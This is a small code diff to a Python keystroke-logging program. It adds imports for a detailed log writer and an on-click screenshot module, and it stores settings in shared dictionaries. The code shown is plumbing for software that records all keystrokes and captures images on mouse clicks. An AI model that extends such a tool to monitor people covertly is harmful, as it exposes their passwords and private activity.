@@ -52,6 +52,10 @@ import threading
 import logging
 from myutils import _settings, _cmdoptions
 
+# event processing threads
+from detailedlogwriter import DetailedLogWriterFirstStage
+from onclickimagecapture import OnClickImageCaptureFirstStage
+
 class KeyLogger:
     '''Captures all keystrokes, enqueue events.
     
@@ -87,6 +91,9 @@ class KeyLogger:
         
         #if os.name == 'nt':
         self.panel = False
+        
+        _settings['settings'] = self.settings
+        _cmdoptions['cmdoptions'] = self.cmdoptions
         
         #if self.options.hookMouse == True:
         #   self.hm.HookMouse()
